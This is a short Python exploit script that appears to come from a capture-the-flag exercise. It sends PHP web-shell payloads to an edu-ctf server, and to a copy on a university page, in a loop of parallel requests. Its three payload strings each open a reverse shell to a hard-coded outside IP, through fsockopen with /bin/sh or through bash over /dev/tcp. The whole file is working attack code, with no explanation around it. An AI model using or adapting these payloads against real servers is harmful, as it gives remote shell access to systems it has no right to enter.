import requests
from multiprocessing.dummy import Pool
pool = Pool(8)

payload = '<?php system("touch ../123");$sock=fsockopen("34.73.27.29",8887);exec("/bin/sh -i <&3 >&3 2>&3"); ?>'
payload = '<?php exec("bash -i >& /dev/tcp/140.112.30.32/1834 0>&1"); ?>'
payload = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/140.112.30.32/1834 0>&1\'");?>'

def run(x):
    r = requests.get('https://edu-ctf.csie.org:10155/', params={'f':'mydir','i':'mydir/meow', 'c[]':x}, verify=False)
    return r

def run_local(x):
    r = requests.get('https://www.csie.ntu.edu.tw/~r08944019/a.php', params={'f':'mydir','i':'mydir/meow', 'c[]':x}, verify=False)
    return r


while True:
    r = pool.map(run_local, ['1'*100, payload])
    if r[0].status_code != 200 or r[1].status_code != 200:
        break
        